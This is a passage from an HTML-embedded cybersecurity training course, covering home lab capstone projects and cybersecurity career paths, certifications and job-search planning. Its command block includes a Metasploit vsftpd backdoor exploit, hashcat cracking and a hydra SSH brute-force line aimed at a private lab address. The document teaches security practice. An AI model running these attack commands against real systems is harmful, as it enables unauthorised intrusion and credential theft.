                  <div class="step-item"><span class="step-num">3</span> Exploitation: SQL Injection (SQLMap). XSS (BeEF, manual payloads). CSRF. Broken authentication. Insecure direct object references (IDOR). File upload vulnerabilities.</div>
                  <div class="step-item"><span class="step-num">4</span> Post-Exploitation: Extract database contents. Hijack admin session. Upload web shell.</div>
                  <div class="step-item"><span class="step-num">5</span> Reporting: Web application security assessment report. Findings with CVSS scores. Remediation guidance.</div>
                </div>
                <p><strong>Deliverables:</strong> Assessment report (PDF), proof-of-concept scripts, screenshots.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Capstone Project 6: Incident Response Tabletop Exercise</h3>
                <p><strong>Objective:</strong> Simulate a security incident and practice the incident response lifecycle.</p>
                <p><strong>Scenario:</strong> Ransomware attack on a corporate network.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Preparation: Write an incident response plan. Define roles (IR manager, SOC analyst, forensics, legal, PR). Prepare a list of contacts.</div>
                  <div class="step-item"><span class="step-num">2</span> Injection: Facilitator injects a scenario: "Multiple users report files are encrypted. A ransom note appeared on shared drives."</div>
                  <div class="step-item"><span class="step-num">3</span> Identification: Team investigates: What systems are affected? What is the malware? How did it enter?</div>
                  <div class="step-item"><span class="step-num">4</span> Containment: Isolate affected systems. Disable compromised accounts. Block C2 IPs.</div>
                  <div class="step-item"><span class="step-num">5</span> Eradication: Remove malware. Patch vulnerability.</div>
                  <div class="step-item"><span class="step-num">6</span> Recovery: Restore from backups. Monitor for reinfection.</div>
                  <div class="step-item"><span class="step-num">7</span> Lessons Learned: Conduct a post-incident review. Update the IR plan.</div>
                </div>
                <p><strong>Deliverables:</strong> Incident response plan, tabletop exercise report, updated playbooks.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool/Resource</span><span>Purpose</span></div>
                  <div class="tool-row"><span>VirtualBox</span><span>Hypervisor</span></div>
                  <div class="tool-row"><span>VMware Workstation Player</span><span>Hypervisor</span></div>
                  <div class="tool-row"><span>Proxmox VE</span><span>Bare-metal hypervisor</span></div>
                  <div class="tool-row"><span>Kali Linux</span><span>Attacker VM</span></div>
                  <div class="tool-row"><span>Metasploitable 2</span><span>Vulnerable target</span></div>
                  <div class="tool-row"><span>DVWA</span><span>Vulnerable web app</span></div>
                  <div class="tool-row"><span>OWASP Juice Shop</span><span>Modern vulnerable web app</span></div>
                  <div class="tool-row"><span>WebGoat</span><span>Vulnerable web app</span></div>
                  <div class="tool-row"><span>VulnHub</span><span>Vulnerable VMs</span></div>
                  <div class="tool-row"><span>TryHackMe</span><span>Guided labs</span></div>
                  <div class="tool-row"><span>Hack The Box</span><span>CTF and labs</span></div>
                  <div class="tool-row"><span>PortSwigger Academy</span><span>Web security labs</span></div>
                  <div class="tool-row"><span>Blue Team Labs Online</span><span>Defensive labs</span></div>
                  <div class="tool-row"><span>LetsDefend</span><span>SOC analyst training</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>SIEM and HIDS</span></div>
                  <div class="tool-row"><span>Security Onion</span><span>Network monitoring</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Zeek</span><span>Network analysis</span></div>
                  <div class="tool-row"><span>Sysmon</span><span>Windows monitoring</span></div>
                  <div class="tool-row"><span>osquery</span><span>Endpoint visibility</span></div>
                  <div class="tool-row"><span>Velociraptor</span><span>Endpoint hunting</span></div>
                  <div class="tool-row"><span>Volatility</span><span>Memory forensics</span></div>
                  <div class="tool-row"><span>FTK Imager</span><span>Disk imaging</span></div>
                  <div class="tool-row"><span>Autopsy</span><span>Disk forensics</span></div>
                  <div class="tool-row"><span>TheHive</span><span>Incident response</span></div>
                  <div class="tool-row"><span>Shuffle</span><span>SOAR</span></div>
                  <div class="tool-row"><span>MISP</span><span>Threat intelligence</span></div>
                  <div class="tool-row"><span>MalwareBazaar</span><span>Malware samples</span></div>
                  <div class="tool-row"><span>Any.Run</span><span>Interactive sandbox</span></div>
                  <div class="tool-row"><span>Hybrid Analysis</span><span>Malware analysis</span></div>
                  <div class="tool-row"><span>Joe Sandbox</span><span>Malware sandbox</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Home Lab &amp; Capstone Commands</span></div>
                  <pre><code># VirtualBox VM management
VBoxManage list vms
VBoxManage startvm "Kali" --type headless

# Full port scan
nmap -sS -sV -p- 192.168.56.101

# Launch Metasploit
msfconsole

# Select exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
set RHOSTS 192.168.56.101

# Execute exploit
run

# Crack MD5 hashes
hashcat -m 0 hashes.txt rockyou.txt

# SSH brute force
hydra -l admin -P pass.txt ssh://192.168.56.101

# Capture traffic
tcpdump -i eth0 -w capture.pcap

# Analyze HTTP
tshark -r capture.pcap -Y "http.request"

# Memory forensics
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">11. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>A home lab is an isolated environment for safe cybersecurity practice.</li>
                  <li>VirtualBox or VMware with Host-Only networking is ideal for beginners.</li>
                  <li>Essential VMs: Kali (attacker), Windows (victim), Metasploitable/DVWA (target).</li>
                  <li>Capstone projects integrate multiple skills and produce portfolio pieces.</li>
                  <li>Project ideas: full penetration test, traffic analysis, malware analysis, SOC lab, web app assessment, tabletop exercise.</li>
                  <li>Offensive practice: exploitation, password cracking, AD attacks, wireless.</li>
                  <li>Defensive practice: SIEM, IDS/IPS, endpoint monitoring, threat hunting, forensics.</li>
                  <li>Document everything; reports are as important as technical skills.</li>
                  <li>Use only isolated labs; never practice on systems you do not own.</li>
                  <li>Resources: TryHackMe, Hack The Box, PortSwigger Academy, VulnHub, Blue Team Labs, LetsDefend.</li>
                  <li>Tools: VirtualBox, Kali, Metasploit, Wireshark, Wazuh, Security Onion, Volatility, TheHive, Shuffle, MISP.</li>
                  <li>Home lab projects demonstrate practical competence and enhance employability.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">12. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.virtualbox.org/" target="_blank" rel="noopener">VirtualBox — Hypervisor</a>
                  <a href="https://www.kali.org/" target="_blank" rel="noopener">Kali Linux — Attacker VM</a>
                  <a href="https://docs.rapid7.com/metasploit/metasploitable-2/" target="_blank" rel="noopener">Metasploitable 2 — Vulnerable target</a>
                  <a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">OWASP Juice Shop — Vulnerable web app</a>
                  <a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe — Guided labs</a>
                  <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box — CTF and labs</a>
                  <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Academy — Web security labs</a>
                  <a href="https://blueteamlabs.online/" target="_blank" rel="noopener">Blue Team Labs Online — Defensive labs</a>
                  <a href="https://letsdefend.io/" target="_blank" rel="noopener">LetsDefend — SOC analyst training</a>
                </div>
              </section>
            ` },
                    { id: "7.2", title: "Career Paths & Next Steps", pages: "621-640", read: 25,
            build: "Create a personal career roadmap with certifications, labs, and job search plan.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Cybersecurity Career Paths</strong> are the structured professional routes an individual can take to specialize in different domains of information security. Each path requires a unique combination of technical skills, certifications, experience, and soft skills. The field is broad, encompassing offensive security, defensive operations, governance, engineering, and forensic disciplines.</p>
                <p><strong>Next Steps</strong> refers to the actionable plan a learner follows after completing foundational training to gain practical experience, earn relevant certifications, build a professional network, and secure employment or advance in their cybersecurity career.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A learner completes a cybersecurity fundamentals course. They build a home lab, practice on TryHackMe and Hack The Box, and earn CompTIA Security+. They create a LinkedIn profile, join cybersecurity communities, and attend local meetups. They apply for entry-level SOC analyst roles, tailor their resume to highlight hands-on lab experience, and prepare for interviews by practicing scenario-based questions. Within three months, they land a Tier 1 SOC Analyst position. After two years, they earn CySA+ and move to Tier 2. After four years, they earn OSCP and transition to penetration testing.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Cybersecurity Career Paths In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/career-paths.png" alt="Cybersecurity career paths — SOC Analyst, Penetration Tester, Incident Responder, Malware Analyst, Security Engineer, GRC, Bug Bounty, CISO" />
                  <figcaption>Figure 7.2 — Diverse career paths in cybersecurity, each with its own skills, tools, and certifications.</figcaption>
                </figure>

                <h4 class="sub-h">Security Operations Center (SOC) Analyst</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Monitor, detect, and respond to security incidents</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Alert triage, incident investigation, escalation, documentation</span></div>
                  <div class="tool-row"><span>Skills</span><span>Networking, SIEM, log analysis, threat intelligence, incident response</span></div>
                  <div class="tool-row"><span>Certifications</span><span>CompTIA Security+, CySA+, Splunk Core, Microsoft SC-200</span></div>
                  <div class="tool-row"><span>Tools</span><span>Splunk, QRadar, Sentinel, Wazuh, CrowdStrike, SentinelOne</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 80,000 – 200,000/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 60,000 – 100,000/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>Tier 1 → Tier 2 → Tier 3 → SOC Manager</span></div>
                </div>

                <h4 class="sub-h">Penetration Tester (Ethical Hacker)</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Simulate attacks to find vulnerabilities before attackers do</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Reconnaissance, exploitation, post-exploitation, reporting</span></div>
                  <div class="tool-row"><span>Skills</span><span>Networking, Linux, Windows, web security, scripting, social engineering</span></div>
                  <div class="tool-row"><span>Certifications</span><span>OSCP, CEH, GPEN, eJPT, PNPT</span></div>
                  <div class="tool-row"><span>Tools</span><span>Metasploit, Burp Suite, Nmap, SQLMap, Hydra, Cobalt Strike</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 100,000 – 300,000/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 80,000 – 150,000/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>Junior Pentester → Pentester → Senior → Team Lead → Manager</span></div>
                </div>

                <h4 class="sub-h">Incident Responder</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Detect, contain, eradicate, and recover from security incidents</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Investigation, forensics, containment, remediation, reporting</span></div>
                  <div class="tool-row"><span>Skills</span><span>Digital forensics, malware analysis, network forensics, IR lifecycle</span></div>
                  <div class="tool-row"><span>Certifications</span><span>GCIH, GCFA, ECIH, CySA+</span></div>
                  <div class="tool-row"><span>Tools</span><span>Volatility, FTK, Autopsy, EnCase, TheHive, Cortex</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 120,000 – 350,000/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 90,000 – 160,000/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>IR Analyst → IR Responder → Senior IR → IR Manager</span></div>
                </div>

                <h4 class="sub-h">Malware Analyst</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Analyze malicious software to understand behavior and impact</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Static analysis, dynamic analysis, reverse engineering, IOC extraction</span></div>
                  <div class="tool-row"><span>Skills</span><span>Assembly, C/C++, Python, debugging, disassembly, sandboxing</span></div>
                  <div class="tool-row"><span>Certifications</span><span>GREM, GCFA, CMFAD</span></div>
                  <div class="tool-row"><span>Tools</span><span>IDA Pro, Ghidra, x64dbg, OllyDbg, Volatility, YARA, Any.Run</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 150,000 – 400,000/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 100,000 – 180,000/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>Malware Analyst → Senior → Lead → Threat Intelligence Manager</span></div>
                </div>

                <h4 class="sub-h">Security Engineer / Architect</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Design, build, and maintain secure systems and networks</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Implement controls, configure firewalls, design architecture, risk assessment</span></div>
                  <div class="tool-row"><span>Skills</span><span>Networking, firewalls, encryption, cloud security, IAM, Zero Trust</span></div>
                  <div class="tool-row"><span>Certifications</span><span>CISSP, CISM, CCSP, AWS Security Specialty</span></div>
                  <div class="tool-row"><span>Tools</span><span>pfSense, Cisco ASA, Palo Alto, Fortinet, AWS Security Hub</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 200,000 – 500,000/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 120,000 – 200,000/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>Engineer → Senior → Architect → Principal → CISO</span></div>
                </div>

                <h4 class="sub-h">Governance, Risk, and Compliance (GRC)</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Ensure organization meets legal, regulatory, and policy requirements</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Policy development, risk assessment, compliance, auditing, training</span></div>
                  <div class="tool-row"><span>Skills</span><span>Risk management, compliance frameworks, policy writing, auditing</span></div>
                  <div class="tool-row"><span>Certifications</span><span>CISA, CISM, CRISC, ISO 27001 Lead Auditor</span></div>
                  <div class="tool-row"><span>Tools</span><span>Risk assessment tools, GRC platforms, audit software</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 150,000 – 400,000/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 100,000 – 170,000/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>GRC Analyst → Specialist → Manager → Director → CISO</span></div>
                </div>

                <h4 class="sub-h">Bug Bounty Hunter</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Independently find vulnerabilities and report for rewards</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Reconnaissance, vulnerability discovery, exploitation, reporting</span></div>
                  <div class="tool-row"><span>Skills</span><span>Web security, mobile security, API security, automation, persistence</span></div>
                  <div class="tool-row"><span>Certifications</span><span>None required; OSCP helpful</span></div>
                  <div class="tool-row"><span>Tools</span><span>Burp Suite, Nmap, Amass, Sublist3r, SQLMap</span></div>
                  <div class="tool-row"><span>Income</span><span>Variable; USD 100 – 10,000+ per bug</span></div>
                  <div class="tool-row"><span>Platforms</span><span>HackerOne, Bugcrowd, YesWeHack, Open Bug Bounty</span></div>
                </div>

                <h4 class="sub-h">Chief Information Security Officer (CISO)</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Details</span></div>
                  <div class="tool-row"><span>Role</span><span>Executive responsible for enterprise security strategy</span></div>
                  <div class="tool-row"><span>Responsibilities</span><span>Strategy, budget, governance, risk, compliance, leadership</span></div>
                  <div class="tool-row"><span>Skills</span><span>Leadership, communication, business acumen, technical depth</span></div>
                  <div class="tool-row"><span>Certifications</span><span>CISSP, CISM, MBA helpful</span></div>
                  <div class="tool-row"><span>Salary (Pakistan)</span><span>PKR 500,000 – 1,500,000+/month</span></div>
                  <div class="tool-row"><span>Salary (International)</span><span>USD 200,000 – 500,000+/year</span></div>
                  <div class="tool-row"><span>Career Progression</span><span>Security Manager → Director → CISO</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Certifications In Depth</h3>

                <h4 class="sub-h">Entry-Level</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Certification</span><span>Provider</span><span>Focus</span><span>Cost</span></div>
                  <div class="tool-row"><span>CompTIA Security+</span><span>CompTIA</span><span>Fundamentals</span><span>~$400</span></div>
                  <div class="tool-row"><span>CompTIA Network+</span><span>CompTIA</span><span>Networking</span><span>~$350</span></div>
                  <div class="tool-row"><span>CompTIA A+</span><span>CompTIA</span><span>IT fundamentals</span><span>~$250</span></div>
                  <div class="tool-row"><span>eJPT</span><span>eLearnSecurity</span><span>Junior pentesting</span><span>~$250</span></div>
                  <div class="tool-row"><span>Microsoft SC-900</span><span>Microsoft</span><span>Security fundamentals</span><span>~$100</span></div>
                </div>

                <h4 class="sub-h">Intermediate</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Certification</span><span>Provider</span><span>Focus</span><span>Cost</span></div>
                  <div class="tool-row"><span>CompTIA CySA+</span><span>CompTIA</span><span>SOC analysis</span><span>~$400</span></div>
                  <div class="tool-row"><span>CEH</span><span>EC-Council</span><span>Ethical hacking</span><span>~$1,200</span></div>
                  <div class="tool-row"><span>OSCP</span><span>OffSec</span><span>Penetration testing</span><span>~$1,600</span></div>
                  <div class="tool-row"><span>GPEN</span><span>GIAC</span><span>Penetration testing</span><span>~$2,500</span></div>
                  <div class="tool-row"><span>GCIH</span><span>GIAC</span><span>Incident handling</span><span>~$2,500</span></div>
                  <div class="tool-row"><span>Splunk Core</span><span>Splunk</span><span>SIEM</span><span>~$130</span></div>
                  <div class="tool-row"><span>Microsoft SC-200</span><span>Microsoft</span><span>Security operations</span><span>~$165</span></div>
                </div>

                <h4 class="sub-h">Advanced</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Certification</span><span>Provider</span><span>Focus</span><span>Cost</span></div>
                  <div class="tool-row"><span>CISSP</span><span>ISC²</span><span>Security management</span><span>~$750</span></div>
                  <div class="tool-row"><span>CISM</span><span>ISACA</span><span>Security management</span><span>~$575</span></div>
                  <div class="tool-row"><span>GCFA</span><span>GIAC</span><span>Forensic analysis</span><span>~$2,500</span></div>
                  <div class="tool-row"><span>GREM</span><span>GIAC</span><span>Malware analysis</span><span>~$2,500</span></div>
                  <div class="tool-row"><span>OSCE</span><span>OffSec</span><span>Advanced exploitation</span><span>~$1,600</span></div>
                  <div class="tool-row"><span>CCSP</span><span>ISC²</span><span>Cloud security</span><span>~$600</span></div>
                  <div class="tool-row"><span>CRISC</span><span>ISACA</span><span>Risk management</span><span>~$575</span></div>
                </div>

                <h4 class="sub-h">Certification Roadmap</h4>
                <ul class="content-list">
                  <li><strong>Beginner:</strong> A+ → Network+ → Security+ → eJPT</li>
                  <li><strong>SOC Analyst:</strong> Security+ → CySA+ → Splunk Core → GCIH</li>
                  <li><strong>Penetration Tester:</strong> Security+ → eJPT → OSCP → GPEN</li>
                  <li><strong>Incident Responder:</strong> Security+ → CySA+ → GCIH → GCFA</li>
                  <li><strong>Malware Analyst:</strong> Security+ → GREM → GCFA</li>
                  <li><strong>Security Engineer:</strong> Security+ → CISSP → CCSP</li>
                  <li><strong>GRC:</strong> Security+ → CISA → CISM → CRISC</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Skills In Depth</h3>

                <h4 class="sub-h">Technical Skills</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Domain</span><span>Skills</span></div>
                  <div class="tool-row"><span>Networking</span><span>TCP/IP, OSI, DNS, DHCP, routing, switching, firewalls</span></div>
                  <div class="tool-row"><span>Operating Systems</span><span>Linux, Windows, macOS, Active Directory</span></div>
                  <div class="tool-row"><span>Security Tools</span><span>Nmap, Wireshark, Metasploit, Burp Suite, Splunk, Wazuh</span></div>
                  <div class="tool-row"><span>Scripting</span><span>Python, Bash, PowerShell, JavaScript</span></div>
                  <div class="tool-row"><span>Cloud</span><span>AWS, Azure, GCP security</span></div>
                  <div class="tool-row"><span>Cryptography</span><span>Encryption, hashing, PKI, TLS</span></div>
                  <div class="tool-row"><span>Web Security</span><span>OWASP Top 10, SQLi, XSS, CSRF</span></div>
                  <div class="tool-row"><span>Forensics</span><span>Disk, memory, network forensics</span></div>
                  <div class="tool-row"><span>Malware</span><span>Static, dynamic, reverse engineering</span></div>
                </div>

                <h4 class="sub-h">Soft Skills</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Skill</span><span>Importance</span></div>
                  <div class="tool-row"><span>Communication</span><span>Essential for reporting and presentations</span></div>
                  <div class="tool-row"><span>Problem Solving</span><span>Critical for troubleshooting and analysis</span></div>
                  <div class="tool-row"><span>Attention to Detail</span><span>Important for forensics and code review</span></div>
                  <div class="tool-row"><span>Continuous Learning</span><span>Threats evolve; must stay updated</span></div>
                  <div class="tool-row"><span>Ethics</span><span>Integrity is paramount</span></div>
                  <div class="tool-row"><span>Teamwork</span><span>Security is a team sport</span></div>
                  <div class="tool-row"><span>Time Management</span><span>Handle multiple incidents</span></div>
                  <div class="tool-row"><span>Writing</span><span>Reports, policies, documentation</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Job Search Strategies</h3>

                <h4 class="sub-h">Resume Building</h4>
                <ul class="content-list">
                  <li>Tailor resume to each job description.</li>
                  <li>Highlight hands-on lab experience and projects.</li>
                  <li>Include certifications (even in progress).</li>
                  <li>Quantify achievements (e.g., "Reduced false positives by 40%").</li>
                  <li>Use keywords from job postings (ATS optimization).</li>
                  <li>Keep it concise (1–2 pages).</li>
                </ul>

                <h4 class="sub-h">Portfolio Development</h4>
                <ul class="content-list">
                  <li>GitHub repository with tools, scripts, and writeups.</li>
                  <li>Blog with CTF walkthroughs and research.</li>
                  <li>LinkedIn profile with certifications and projects.</li>
                  <li>Personal website with resume and contact.</li>
                  <li>Contribute to open-source security projects.</li>
                </ul>

                <h4 class="sub-h">Networking</h4>
                <ul class="content-list">
                  <li>Attend local cybersecurity meetups (e.g., BSides, OWASP chapters).</li>
                  <li>Join online communities (Discord, Reddit, LinkedIn groups).</li>
                  <li>Connect with professionals on LinkedIn.</li>
                  <li>Attend conferences (DEF CON, Black Hat, local events).</li>
                  <li>Participate in CTFs and hackathons.</li>
                </ul>

                <h4 class="sub-h">Interview Preparation</h4>
                <ul class="content-list">
                  <li>Practice scenario-based questions (e.g., "How would you investigate a phishing email?").</li>
                  <li>Review common tools and commands.</li>
                  <li>Prepare to explain your lab projects.</li>
                  <li>Practice behavioral questions (STAR method).</li>
                  <li>Conduct mock interviews with peers.</li>
                </ul>

                <h4 class="sub-h">Job Boards</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Platform</span><span>Link</span></div>
                  <div class="tool-row"><span>LinkedIn</span><span>https://www.linkedin.com/jobs/</span></div>
                  <div class="tool-row"><span>Indeed</span><span>https://www.indeed.com/</span></div>
                  <div class="tool-row"><span>Glassdoor</span><span>https://www.glassdoor.com/</span></div>
                  <div class="tool-row"><span>Rozee.pk</span><span>https://www.rozee.pk/</span></div>
                  <div class="tool-row"><span>Mustakbil</span><span>https://www.mustakbil.com/</span></div>
                  <div class="tool-row"><span>Dice</span><span>https://www.dice.com/</span></div>
                  <div class="tool-row"><span>CyberSecJobs</span><span>https://www.cybersecjobs.com/</span></div>
                  <div class="tool-row"><span>USAJobs</span><span>https://www.usajobs.gov/</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Next Steps — Action Plan</h3>

                <h4 class="sub-h">Immediate (0–3 Months)</h4>
                <ul class="content-list">
                  <li>Complete foundational courses (this course).</li>
                  <li>Build a home lab (VirtualBox + Kali + Metasploitable).</li>
                  <li>Practice on TryHackMe and Hack The Box.</li>
                  <li>Start a portfolio (GitHub, blog).</li>
                  <li>Earn CompTIA Security+ (or Network+ first).</li>
                  <li>Join cybersecurity communities.</li>
                </ul>

                <h4 class="sub-h">Short-Term (3–12 Months)</h4>
                <ul class="content-list">
                  <li>Earn an intermediate certification (CySA+, eJPT, or CEH).</li>
                  <li>Complete 20+ CTF challenges.</li>
                  <li>Write 5+ blog posts or writeups.</li>
                  <li>Attend local meetups and conferences.</li>
                  <li>Apply for internships or entry-level roles.</li>
                  <li>Build a professional LinkedIn network.</li>
                </ul>

                <h4 class="sub-h">Medium-Term (1–3 Years)</h4>
                <ul class="content-list">
                  <li>Land first cybersecurity job (SOC, pentesting, IR).</li>
                  <li>Earn advanced certification (OSCP, GCIH, GCFA).</li>
                  <li>Specialize in a domain (pentesting, forensics, malware).</li>
                  <li>Speak at a local meetup or conference.</li>
                  <li>Mentor junior analysts.</li>
                  <li>Contribute to open-source security tools.</li>
                </ul>

                <h4 class="sub-h">Long-Term (3–5+ Years)</h4>
                <ul class="content-list">
                  <li>Advance to senior or lead role.</li>
                  <li>Earn expert certification (CISSP, CISM, GREM).</li>
                  <li>Develop leadership and management skills.</li>
                  <li>Consider MBA or advanced degree (optional).</li>
                  <li>Pursue CISO or principal consultant track.</li>
                  <li>Give back to the community through teaching and research.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Tools &amp; Resources</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Resource</span><span>Purpose</span><span>Link</span></div>
                  <div class="tool-row"><span>TryHackMe</span><span>Guided labs</span><span>https://tryhackme.com/</span></div>
                  <div class="tool-row"><span>Hack The Box</span><span>CTF and labs</span><span>https://www.hackthebox.com/</span></div>
                  <div class="tool-row"><span>PortSwigger Academy</span><span>Web security labs</span><span>https://portswigger.net/web-security</span></div>
                  <div class="tool-row"><span>Blue Team Labs Online</span><span>Defensive labs</span><span>https://blueteamlabs.online/</span></div>
                  <div class="tool-row"><span>LetsDefend</span><span>SOC analyst training</span><span>https://letsdefend.io/</span></div>
                  <div class="tool-row"><span>VulnHub</span><span>Vulnerable VMs</span><span>https://www.vulnhub.com/</span></div>
                  <div class="tool-row"><span>Cybrary</span><span>Free courses</span><span>https://www.cybrary.it/</span></div>
                  <div class="tool-row"><span>SANS</span><span>Professional training</span><span>https://www.sans.org/</span></div>
                  <div class="tool-row"><span>OffSec</span><span>OSCP and advanced training</span><span>https://www.offsec.com/</span></div>
                  <div class="tool-row"><span>CompTIA</span><span>Certifications</span><span>https://www.comptia.org/</span></div>
                  <div class="tool-row"><span>ISC²</span><span>CISSP and certifications</span><span>https://www.isc2.org/</span></div>
                  <div class="tool-row"><span>ISACA</span><span>CISA, CISM, CRISC</span><span>https://www.isaca.org/</span></div>
                  <div class="tool-row"><span>GIAC</span><span>SANS certifications</span><span>https://www.giac.org/</span></div>
                  <div class="tool-row"><span>HackerOne</span><span>Bug bounty</span><span>https://www.hackerone.com/</span></div>
                  <div class="tool-row"><span>Bugcrowd</span><span>Bug bounty</span><span>https://www.bugcrowd.com/</span></div>
                  <div class="tool-row"><span>YesWeHack</span><span>Bug bounty</span><span>https://www.yeswehack.com/</span></div>
                  <div class="tool-row"><span>LinkedIn</span><span>Professional networking</span><span>https://www.linkedin.com/</span></div>
                  <div class="tool-row"><span>BSides</span><span>Local conferences</span><span>https://www.securitybsides.com/</span></div>
                  <div class="tool-row"><span>OWASP</span><span>Web security community</span><span>https://owasp.org/</span></div>
                  <div class="tool-row"><span>DEF CON</span><span>Hacking conference</span><span>https://defcon.org/</span></div>
                  <div class="tool-row"><span>Black Hat</span><span>Security conference</span><span>https://www.blackhat.com/</span></div>
                </div>

                <h4 class="sub-h">Recommended Books</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Book</span><span>Author</span><span>Focus</span></div>
                  <div class="tool-row"><span>The Web Application Hacker's Handbook</span><span>Stuttard &amp; Pinto</span><span>Web security</span></div>
                  <div class="tool-row"><span>Penetration Testing</span><span>Georgia Weidman</span><span>Pentesting</span></div>
                  <div class="tool-row"><span>The Hacker Playbook 3</span><span>Peter Kim</span><span>Red teaming</span></div>
                  <div class="tool-row"><span>Blue Team Handbook</span><span>Don Murdoch</span><span>SOC and IR</span></div>
                  <div class="tool-row"><span>Practical Malware Analysis</span><span>Sikorski &amp; Honig</span><span>Malware analysis</span></div>
                  <div class="tool-row"><span>The Art of Memory Forensics</span><span>Ligh et al.</span><span>Memory forensics</span></div>
                  <div class="tool-row"><span>Network Security Assessment</span><span>Chris McNab</span><span>Network security</span></div>
                  <div class="tool-row"><span>Cryptography Engineering</span><span>Ferguson et al.</span><span>Cryptography</span></div>
                </div>

                <h4 class="sub-h">Recommended YouTube Channels</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Channel</span><span>Focus</span></div>
                  <div class="tool-row"><span>John Hammond</span><span>Malware analysis, CTFs</span></div>
                  <div class="tool-row"><span>NetworkChuck</span><span>Networking, security</span></div>
                  <div class="tool-row"><span>Professor Messer</span><span>CompTIA certifications</span></div>
                  <div class="tool-row"><span>LiveOverflow</span><span>Reverse engineering, CTFs</span></div>
                  <div class="tool-row"><span>IppSec</span><span>Hack The Box walkthroughs</span></div>
                  <div class="tool-row"><span>The Cyber Mentor</span><span>Pentesting</span></div>
                  <div class="tool-row"><span>STÖK</span><span>Bug bounty</span></div>
                  <div class="tool-row"><span>Null Byte</span><span>Hacking tutorials</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
